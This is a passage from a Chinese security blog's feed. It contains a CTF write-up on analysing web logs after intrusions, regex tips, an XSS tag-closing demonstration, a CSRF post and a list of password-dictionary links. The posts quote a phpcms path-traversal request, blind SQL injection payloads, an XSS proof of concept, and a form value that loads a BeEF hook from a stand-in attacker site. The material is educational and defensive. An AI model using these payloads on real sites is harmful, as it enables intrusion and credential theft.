    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前打铁人三项数据赛经常交给我来，总结了一些分析web日志的干货。<br><a id="more"></a></p><p>相关资料：<br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/0.png" alt></p><pre><code>【链接: https://pan.baidu.com/s/1o7FcHui 密码: jpdn】</code></pre><h2 id="1-工具"><a href="#1-工具" class="headerlink" title="1. 工具"></a>1. 工具</h2><p>我做日志分析经常用到的工具就是 </p><ol><li>ApacheLogsViewer</li><li>SubLime或者Notepad++</li><li>BeyondCompare</li></ol><h2 id="2-日志格式学习"><a href="#2-日志格式学习" class="headerlink" title="2. 日志格式学习"></a>2. 日志格式学习</h2><p>一条访问信息记录如下：</p><pre><code>218.19.140.242 - - [10/Dec/2010:09:31:17 +0800] &quot;GET /query/trendxml/district/todayreturn/month/2009-12-14/2010-12-09/haizhu_tianhe.xml HTTP/1.1&quot; 200 1933 &quot;-&quot; &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 (.NET CLR 3.5.30729)&quot;</code></pre><p>从这条信息可以获取到九条信息：</p><ol><li><p>218.19.140.242<br>这是一个请求到 apache 服务器的客户端 ip, 默认的情况下,第一项信息只是远程主机的 ip 地址,但我们如果需要apache 查出主机的名字,可以将 HostnameLookups 设置为 on, 但这种做法是不推荐使用,因为它大大的减缓了服务器。另外这里的 ip 地址不一定就是客户主机的 ip 地址，如果 客户端使用了代理服务器,那么这里的 ip 就是代理服务器的地址,而不是原机. </p></li><li><p>-<br>输出中的“连字符”表示请求的信息不可用。在这种情况下，不可用的信息是由客户机上的identid确定的客户机的RFC 1413标识。这种信息是高度不可靠的，几乎不应该使用，除非在严格控制的内部网络。除非IdentityCheck设置为On，否则Apache httpd甚至不会尝试确定此信息</p></li><li><p>-<br>这一项又是为空白,不过这项是用户记录用户 HTTP 的身份验证,如果某些网站要求用户进行身份验证,那么这一项就是记录用户的身份信息 </p></li><li><p>[10/Dec/2010:09:31:17 +0800] </p></li></ol><p>第四项是记录请求的时间,格式为 <code>[day/month/year:hour:minute:second zone]</code>, 最后的 <code>+0800</code> 表示服务器所处的时区为东八区</p><ol start="5"><li>“GET /query/trendxml/district/todayreturn/month/2009-12-14/2010-12-09/haizhu_tianhe.xml HTTP/1.1”</li></ol><p>这一项整个记录中最有用的信息,首先,它告诉我们的服务器收到的是一个 GET 请求,其次,是客户端请求的资源路径,第三,客户端使用的协议是 HTTP/1.1, 整个格式为 “%m %U%q %H” ,即”请求方法/访问路径/协议” </p><ol start="5"><li><p>200<br>这是一个状态码,由服务器端发送回客户端,它告诉我们客户端的请求是否成功,或者是重定向,或者是碰到了什么样的错误,这项值为 200，表示服务器已经成功的响应了客户端的请求,一般来说,这项值以 2 开头的表示请求成功,以 3 开头的表示重定向,以 4 开头的标示客户端存在某些的错误,以 5 开头的标示服务器端存在某些错误。本人博客有一篇文章专门讲了状态码</p></li><li><p>1933<br>这项表示服务器向客户端发送了多少的字节,在日志分析统计的时侯,把这些字节加起来就可以得知服务器在某点时间内总的发送数据量是多少。</p></li><li><ul><li>HTTP Referer：告诉服务器我是从哪个页面链接过来的,没有值时可能是直接打开网页的原因。</li></ul></li><li><p>“Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 (.NET CLR 3.5.30729)”</p></li></ol><p>User-Agent 这项主要记录客户端的浏览器信息</p><h2 id="3-黑客入侵日志分析"><a href="#3-黑客入侵日志分析" class="headerlink" title="3. 黑客入侵日志分析"></a>3. 黑客入侵日志分析</h2><p>客户的网站被大黑阔入侵了，你现在需要做的是:</p><blockquote><p>1、找到入侵的 IP 地址<br><br>2、入侵者如何找到网站后台的？<br><br>3、入侵者如何进入后台？<br><br>4、入侵者修改了什么文件来写一句话？<br><br>5、入侵者通过一句话后门做了什么？<br></p></blockquote><p>开始做，下载日志分析</p><ul><li><code>【access.log】</code></li><li><code>【error.log】</code></li></ul><p>先看<code>access.log</code><br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/1.png" alt></p><p>利用<strong>sublime</strong>和<strong>notepadd++</strong>都可以看，如果想看的方便一下可以用<strong>ApacheLogsViewer</strong><br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/2.png" alt></p><h3 id="1-找到入侵的-IP-地址"><a href="#1-找到入侵的-IP-地址" class="headerlink" title="(1)找到入侵的 IP 地址"></a>(1)找到入侵的 IP 地址</h3><p>因为一般来说，如果不能一下子找到后台的话，就需要用一些目录爆破工具，而爆破的过程中，因为请求了很多不存在的目录，就会出现很多 404 状态的日志。</p><p>我们可以看一下报错状态的记录，点击【status】，就能发现了有几个 IP 的请求出现了404。<br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/3.png" alt><br>再往下拉，可以发现很明显的带有 payload 的恶意请求，它们都来自 IP【219.239.105.18】，说明这个 IP 地址就是大黑阔的地址。<br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/4.png" alt></p><h3 id="2-入侵者如何找到后台的"><a href="#2-入侵者如何找到后台的" class="headerlink" title="(2)入侵者如何找到后台的"></a>(2)入侵者如何找到后台的</h3><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/5.png" alt><br>放到过滤器里，使用包括【include】的方式，然后应用该过滤【Apply Filter】<br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/6.png" alt></p><p>过滤出来的数据，点击【Date】按递增时间排序，就可以看到第一条记录是【2016/8/9 2:54:12】，即是入侵者第一次访问时间。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/7.png" alt><br>往下看，可以看到出现大量 404 的访问记录，说明是在爆目录。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/8.png" alt></p><p>到了【2016/8/9 22:17:02】之后明显没有 404 访问记录，说明已经停止了爆目录，并且可以看到入侵者开始访问后台了。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/9.png" alt></p><h3 id="3-入侵者如何进入后台"><a href="#3-入侵者如何进入后台" class="headerlink" title="(3) 入侵者如何进入后台"></a>(3) 入侵者如何进入后台</h3><p>从【2016/8/9 22:37:30】开始可以看到大量的 POST 请求，几秒之内就有多个请求，说明这是在进行爆破。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/10.png" alt></p><p>而在【2016/8/9 23:02:28】从<code>【http://192.168.0.104/phpcms/index.php?m=admin&amp;c=index&amp;a=public_current_pos&amp;menuid=10】</code>这一条开始，请求的内容都是后台界面才有的，可见入侵者成功爆破出密码并登录后台。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/11.png" alt></p><h3 id="4-入侵者动了哪个文件"><a href="#4-入侵者动了哪个文件" class="headerlink" title="(4) 入侵者动了哪个文件"></a>(4) 入侵者动了哪个文件</h3><p>我们可以看到最后这一句</p><pre><code>GET /index.php?%20%20m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../phpsso_server/caches/configs/database.php HTTP/1.1</code></pre><p>通过搜索相关资料<a href="http://blog.csdn.net/god_7z1/article/details/7816389" target="_blank" rel="noopener">http://blog.csdn.net/god_7z1/article/details/7816389</a><br>可以知道该漏洞的利用方法如下：</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/12.png" alt></p><p>这一部分即是入侵者在修改的时候发起的请求：</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/13.png" alt></p><h3 id="5-入侵者做了什么"><a href="#5-入侵者做了什么" class="headerlink" title="(5) 入侵者做了什么"></a>(5) 入侵者做了什么</h3><p>可以看到读取了数据库的帐号密码和系统的帐号密码。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/14.png" alt></p><h2 id="4-SQL注入日志分析"><a href="#4-SQL注入日志分析" class="headerlink" title="4. SQL注入日志分析"></a>4. SQL注入日志分析</h2><p>客户的网站又被入侵了，而且还是 sql 注入的形式，你现在需要做的是</p><blockquote><p>1、入侵者使用的方法属于 sql 注入中的什么方法?<br><br>2、入侵者从什么时候开始用脚本跑数据的？<br><br>3、入侵者的 payload 格式是怎样的，解译一下。<br><br>4、入侵者拿到了什么数据？数据内容是什么？<br></p></blockquote><p>下载日志文件之后，发现是都是类似的请求<br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/15.png" alt></p><h3 id="1-入侵者使用的是sql注入中的哪种注入"><a href="#1-入侵者使用的是sql注入中的哪种注入" class="headerlink" title="(1) 入侵者使用的是sql注入中的哪种注入"></a>(1) 入侵者使用的是sql注入中的哪种注入</h3><pre><code>GET /?id=1%27%20and%20ascii(substr((select%20database()),1,1))%3E104%23 HTTP/1.1</code></pre><p>很明显是通过盲注的形式跑数据的。使用盲注的脚本可以参考：</p><p><a href="https://github.com/yuesecurity/sqli-exploit/blob/master/sqliblind/sqlibaseblind.py" target="_blank" rel="noopener">https://github.com/yuesecurity/sqli-exploit/blob/master/sqliblind/sqlibaseblind.py</a></p><h3 id="2-入侵者用脚本跑数据的时间"><a href="#2-入侵者用脚本跑数据的时间" class="headerlink" title="(2) 入侵者用脚本跑数据的时间"></a>(2) 入侵者用脚本跑数据的时间</h3><p>从【2017/9/2 12:20:42】开始短时间内发起大量请求。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/16.png" alt></p><h3 id="3-入侵者的payload是什么"><a href="#3-入侵者的payload是什么" class="headerlink" title="(3) 入侵者的payload是什么"></a>(3) 入侵者的payload是什么</h3><pre><code>/?id=1%27%20and%20ascii(substr((select%20database()),1,1))=114%23】</code></pre><p>其中读取 database()，然后 substr 选择。<br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/17.png" alt><br>选择出来的数据用 ascii 编码，与后面的数字 114 比较。</p><h3 id="4-入侵者得到了什么"><a href="#4-入侵者得到了什么" class="headerlink" title="(4) 入侵者得到了什么"></a>(4) 入侵者得到了什么</h3><p>拿到 database() 和 user()。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/18.png" alt><br>仔细观察，可以发现是后面的 1 去比较这个 database() 的 1 到 15 位。然后再用 2 去比较 1 到 15 位。</p><p>而判断是否匹配的方法是看返回的包的大小：</p><p>【654】包的数量比【665】的多很多，【665】的包是盲注匹配成功时候返回的包。<br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/19.png" alt><br>于是把【665】的包里的数值一个个写到表格里，用 <a href="http://evilcos.me/lab/xssor/" target="_blank" rel="noopener">http://evilcos.me/lab/xssor/</a> 转成对应的字符。当然我比较懒，这里没有填完。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/20.png" alt></p><p>还是用脚本跑一下比较爽：</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/21.png" alt></p><p>可以看到 database 是【security】，user 是【flag0isfjisas8hh@loc】。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前打铁人三项数据赛经常交给我来，总结了一些分析web日志的干货。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="http://black0saturday.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式小贴士</title>
    <link href="http://black0saturday.github.io/2020/04/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%B0%8F%E8%B4%B4%E5%A3%AB/"/>
    <id>http://black0saturday.github.io/2020/04/07/正则表达式小贴士/</id>
    <published>2020-04-07T06:06:18.000Z</published>
    <updated>2020-04-07T07:44:09.327Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正则表达式是一个非常强大的处理字符工具，但有时可读性很差、晦涩难懂。</p><hr><a id="more"></a><p>本来是一个问题，引入正则表达式之后就成了两个问题。其实并不是任何场景都需要正则表达式。在简单场景，能用字符串自己提供的方法解决问题就没必要用正则表达式，比如字符替换</p><pre><code>&gt;&gt;&gt; import re&gt;&gt;&gt; text = &apos;java is most popular language&apos;&gt;&gt;&gt; re.sub(r&apos;java&apos;, &apos;python&apos;, text)&apos;python is most popular language&apos;# good&gt;&gt;&gt; text.replace(&quot;java&quot;, &quot;python&quot;)&apos;python is most popular language&apos;</code></pre><p>判断字符串是否以某字符开头</p><pre><code>&gt;&gt;&gt; re.match(r&quot;^java&quot;, text)&lt;_sre.SRE_Match object at 0x000000000471D578&gt;&gt;&gt;&gt; text.startwith(&quot;java&quot;)# good&gt;&gt;&gt; text.startswith(&quot;java&quot;)True</code></pre><h3 id="0x01-re-match-与-re-search"><a href="#0x01-re-match-与-re-search" class="headerlink" title="0x01 re.match() 与 re.search()"></a>0x01 re.match() 与 re.search()</h3><p>re.match 从字符串的起始位置匹配，如果没匹配成功就不再往后匹配，返回 None。而 search 虽然也是从起始位置开始匹配，但是如果在起始位置没有匹配，就继续往后匹配，直到匹配为止，如果匹配到字符串末尾都没有匹配则返回 None</p><pre><code>&gt;&gt;&gt; text = &quot;java is most popular langauge&quot;&gt;&gt;&gt; re.match(&quot;most&quot;, text) # 没匹配# bad&gt;&gt;&gt; re.match(&quot;.*most&quot;, text) &lt;_sre.SRE_Match object at 0x0000000004CCD578&gt;# good&gt;&gt;&gt; re.search(&quot;most&quot;, text)&lt;_sre.SRE_Match object at 0x000000000471D578&gt;</code></pre><h3 id="0x02-不分组的括号"><a href="#0x02-不分组的括号" class="headerlink" title="0x02 不分组的括号"></a>0x02 不分组的括号</h3><p>我们知道正则表达式中括号可以用于分组提取，有时我们并不希望括号用于分组该怎么办，答案是使用 (?:)，看一个例子，用正则表达式提取URL中的各个组成部分<br><img src="/2020/04/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%B0%8F%E8%B4%B4%E5%A3%AB/1.webp" alt></p><pre><code>rex = r&apos;^(http[s]?)://([^/\s]+)([/\w\-\.]+[^#?\s]*)?(?:\?([^#]*))?(?:#(.*))?$&apos;print(re.match(rex, url).groups())&gt;&gt;&gt; (&apos;http&apos;,     &apos;www.example.com&apos;,      &apos;/path/to/myfile.html&apos;,      &apos;key1=value1&amp;key2=value2&apos;,      &apos;SomewhereInTheDocument&apos;)</code></pre><p>上面虽然写了7对括号，但其实只有5个分组。下面是不使用 ?:，出现了 7 组数据</p><pre><code>rex = r&apos;^(http[s]?)://([^/\s]+)([/\w\-\.]+[^#?\s]*)?(\?([^#]*))?(#(.*))?$&apos;print(re.match(rex, url).groups())&gt;&gt;&gt;(&apos;http&apos;,     &apos;www.example.com&apos;,     &apos;/path/to/myfile.html&apos;,     &apos;?key1=value1&amp;key2=value2&apos;,     &apos;key1=value1&amp;key2=value2&apos;,     &apos;#SomewhereInTheDocument&apos;,     &apos;SomewhereInTheDocument&apos;)</code></pre><h3 id="0x03-贪婪匹配"><a href="#0x03-贪婪匹配" class="headerlink" title="0x03 贪婪匹配"></a>0x03 贪婪匹配</h3><p>正则表达式默认是贪婪匹配的，也就是说它会在满足匹配条件的情况下尽可能多的匹配字符，例如这里有一段话：<br>    html = “””<div><p>Today a quick article on a nic</p><p>Read more …</p></div>“””<br>里面有两对</p><p>标签，如果你只想匹配第一对，使用</p><pre><code>&gt;&gt;&gt; re.search(&quot;&lt;p&gt;.*&lt;/p&gt;&quot;, html)&gt;&gt;&gt; m = re.search(&quot;&lt;p&gt;.*&lt;/p&gt;&quot;, html)&gt;&gt;&gt; m.group()&apos;&lt;p&gt;Today a quick article on a nic&lt;/p&gt;&lt;p&gt;Read more ...&lt;/p&gt;&apos;&gt;&gt;&gt;</code></pre><p><code>&lt;p&gt;.*&lt;/p&gt;</code> 会从第一个<code>&lt;p&gt;</code>开始，匹配到最后一个<code>&lt;/p&gt;</code>，如果要想尽可能少匹配则可以在元字符后面加 <code>?</code></p><pre><code>&gt;&gt;&gt; m = re.search(&quot;&lt;p&gt;.*?&lt;/p&gt;&quot;, html)&gt;&gt;&gt; m.group()&apos;&lt;p&gt;Today a quick article on a nic&lt;/p&gt;&apos;</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;正则表达式是一个非常强大的处理字符工具，但有时可读性很差、晦涩难懂。&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>HTML中优先闭合的标签</title>
    <link href="http://black0saturday.github.io/2020/04/04/HTML%E4%B8%AD%E4%BC%98%E5%85%88%E9%97%AD%E5%90%88%E7%9A%84%E6%A0%87%E7%AD%BE/"/>
    <id>http://black0saturday.github.io/2020/04/04/HTML中优先闭合的标签/</id>
    <published>2020-04-04T03:28:31.000Z</published>
    <updated>2020-04-07T07:43:39.597Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习HTML时发现有个有趣的现象，就是有的标签会优先闭合。<br><a id="more"></a><br>先看一段 HTML：</p><pre><code>&lt;html&gt;    &lt;head&gt;&lt;title&gt;noframes&lt;/title&gt;&lt;/head&gt;    &lt;body&gt;        &lt;noframes&gt;            &lt;img src=&quot;//x.xx/?x=&lt;/noframes&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot; width=0 height=0/&gt;        &lt;/noframes&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>HTML正常读大概就是展示一张图片。<br>那么用浏览器打开看看。</p><p><img src="/2020/04/04/HTML%E4%B8%AD%E4%BC%98%E5%85%88%E9%97%AD%E5%90%88%E7%9A%84%E6%A0%87%E7%AD%BE/1.webp" alt></p><p>并没有按照想象中的展示图片而是弹了个窗。</p><p>看看浏览器处理的源码<br><img src="/2020/04/04/HTML%E4%B8%AD%E4%BC%98%E5%85%88%E9%97%AD%E5%90%88%E7%9A%84%E6%A0%87%E7%AD%BE/1.png" alt></p><p>原来，<strong>img</strong> 标签 <strong>src</strong> 属性里的 <strong>\&lt;/noframes></strong>，跳过了 <strong>\&lt;img></strong> 标签和 <strong>src</strong> 属性，把外层的 <strong>\&lt;noframes></strong> 给闭合了，导致 <strong>src</strong> 后半部分的 <strong>script</strong> 标签被解析成了 HTML，从而触发了弹框。</p><p>这可奇怪了。<strong>\&lt;/noframes></strong> 明明在双引号里面，怎么就跨越了 <strong>src</strong> 属性跨越了 <strong>\&lt;img></strong> 标签，漂洋过海地把外层的 <strong>noframes</strong> 标签给闭合了？有一种可能就是，它的闭合优先级，高于双引号的完整性优先级，高于嵌套在内层的标签的闭合优先级。</p><p>研究发现，还有一些标签是闭合优先级高于双引号完整性优先级的特殊标签。</p><ul><li>\&lt;!–</li><li>\&lt;iframe></li><li>\&lt;noframes></li><li>\&lt;noscript></li><li>\&lt;script></li><li>\&lt;style></li><li>\&lt;textarea></li><li>\&lt;title></li><li>\&lt;xmp></li></ul><hr><h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>这个特性出现的原因，可能是源于浏览器对 DOM 树的特殊处理。而在某些 XSS 攻击的场景下，这一特性可能导致意想不到的结果。</p><p>特别是，像邮箱或论坛等支持富文本的应用，出于防御 XSS 的考虑，一定会对用户的输入进行语法分析和检查。但是，如果语法分析的结果和浏览器的识别结果不一致的话，就会形成 XSS 的攻击点。</p><p>比如文章开头的那段 noframes 语句，如果防 XSS 引擎将 src 里的内容统一理解为 img 的 src 属性，就可能形成 XSS 攻击的入口点。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;学习HTML时发现有个有趣的现象，就是有的标签会优先闭合。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="XSS" scheme="http://black0saturday.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>WEB漏洞-CSRF</title>
    <link href="http://black0saturday.github.io/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/"/>
    <id>http://black0saturday.github.io/2020/04/02/WEB漏洞-CSRF/</id>
    <published>2020-04-02T06:52:08.000Z</published>
    <updated>2020-04-03T03:07:43.313Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>CSRF曾在2007年、2010年、2013年三次入围OWASP TOP10。因为越来越多的框架提供了secure by default的设定和一些形式的保护，这也就是说CSRF不再是一个问题。这也就是2017版的CSRF不再出现在OWASP TOP10的原因。<br><a id="more"></a></p><p>研究人员发现，可以利用CSRF来传播大量的payload到终端用户。攻击者常用的CSRF传播的payload是：</p><ul><li>Persistent Cross Site Scripting (XSS)</li><li>CSV Injection (CSVi)</li><li>CSV Injection to Reflected Cross Site Scripting (XSS)</li></ul><hr><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><strong>一个跨站请求伪造攻击迫使登录用户的浏览器将伪造的HTTP请求，包括该用户的会话cookie和其他认证信息，发送一个存在漏洞的web应用程序。这即允许攻击者迫使用户浏览器向存在漏洞的应用程序发送请求，并且这些请求会被应用程序认为是用户的合法请求。</strong></p><h3 id="CSRF-Payload传播"><a href="#CSRF-Payload传播" class="headerlink" title="CSRF Payload传播"></a>CSRF Payload传播</h3><p>研究人员发现可以通过一个简单的CSRF PoC来传播所有类型的payload，因为大多数社会工程场景中的CSRF是一样的。<br>下面是一个登入的win form:<br><img src="/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/1.png" alt></p><p>页面前端代码如下：<br><img src="/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/2.png" alt></p><p>为了解释请求，第一部分的H1和input并没有什么用处，真实的payload是隐藏在input表单中。这也是CSRF发生的地方，攻击者可以让这些值有意义。攻击者可以利用这些payload的传播来设定payload的值。在XSS设定的例子中，会在域名内弹出一个告警框。</p><p>但是这个值可以是任何值，在更加恶意的环境中，攻击者可以利用浏览器或利用框架来hook受害者的浏览器。这样的恶意表单示例如下：<br><img src="/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/3.png" alt></p><p>把<strong>value</strong>的值改成如下代码<br>    value=”<script src="https://attackersite/beef.js"></script>“ /&gt;</p><p>Payload被注入到firstname域中，表单会通过请求提交的方式传递到攻击者的服务器，然后受害者的服务器就会用JS脚本钩住用于下一步的利用。根据应用的功能，攻击者payload会传递持久型和反射型的XSS脚本。</p><hr><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><h3 id="CSV注入payload"><a href="#CSV注入payload" class="headerlink" title="CSV注入payload"></a>CSV注入payload</h3><ul><li>Python</li></ul><p>`</p><pre><code>def escape(payload):    if payload[0] in (&apos;@&apos;,&apos;+&apos;,&apos;-&apos;, &apos;=&apos;, &apos;|&apos;, &apos;%&apos;):     payload = payload.replace(&quot;|&quot;, &quot;\|&quot;)     payload = &quot;&apos;&quot; + payload + &quot;&apos;&quot;     return payload</code></pre><ul><li>PHP</li></ul><p>`</p><pre><code>public static function escape_csv( $payload ) {    $triggers = array( &apos;=&apos;, &apos;+&apos;, &apos;-&apos;, &apos;@&apos;, &apos;|&apos;, &apos;%&apos;);    if ( in_array( mb_substr( $payload, 0, 1 ), $triggers, true ) ) {    $payload = &quot;&apos;&quot; . $payload . &quot;&apos;&quot;;        }return $payload;    }</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;CSRF曾在2007年、2010年、2013年三次入围OWASP TOP10。因为越来越多的框架提供了secure by default的设定和一些形式的保护，这也就是说CSRF不再是一个问题。这也就是2017版的CSRF不再出现在OWASP TOP10的原因。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CSRF" scheme="http://black0saturday.github.io/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>常见密码字典</title>
    <link href="http://black0saturday.github.io/2020/04/01/%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8/"/>
    <id>http://black0saturday.github.io/2020/04/01/常见密码字典/</id>
    <published>2020-04-01T06:33:43.000Z</published>
    <updated>2020-04-01T09:05:41.871Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>收集一些常见密码字典<br><a id="more"></a></p><h3 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h3><ul><li><a href="https://pan.baidu.com/share/link?shareid=193969&amp;uk=1965926143" target="_blank" rel="noopener">https://pan.baidu.com/share/link?shareid=193969&amp;uk=1965926143</a></li><li><a href="https://pan.baidu.com/share/link?shareid=193972&amp;uk=1965926143" target="_blank" rel="noopener">https://pan.baidu.com/share/link?shareid=193972&amp;uk=1965926143</a></li><li><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a></li><li><a href="https://github.com/TheKingOfDuck/fuzzDicts" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/fuzzDicts</a></li><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/top_100.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/top_100.txt</a></li><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/top_1000.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/top_1000.txt</a></li><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/top_500.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/top_500.txt</a></li><li><a href="https://github.com/noootown/PasswordDictionary" target="_blank" rel="noopener">https://github.com/noootown/PasswordDictionary</a></li><li><a href="https://github.com/hxer/dictTree" target="_blank" rel="noopener">https://github.com/hxer/dictTree</a><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3></li><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/web-fuzz-dict.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/web-fuzz-dict.txt</a></li></ul><h3 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h3><ul><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/user-agents.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/user-agents.txt</a></li></ul><h3 id="File-Locations"><a href="#File-Locations" class="headerlink" title="File-Locations"></a>File-Locations</h3><ul><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/file-locations.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/file-locations.txt</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;收集一些常见密码字典&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="爆破" scheme="http://black0saturday.github.io/tags/%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>常见web危险端口介绍</title>
    <link href="http://black0saturday.github.io/2020/03/31/%E5%B8%B8%E8%A7%81web%E5%8D%B1%E9%99%A9%E7%AB%AF%E5%8F%A3%E4%BB%8B%E7%BB%8D/"/>
    <id>http://black0saturday.github.io/2020/03/31/常见web危险端口介绍/</id>
    <published>2020-03-31T08:43:53.000Z</published>
    <updated>2020-04-01T09:55:50.467Z</updated>
    
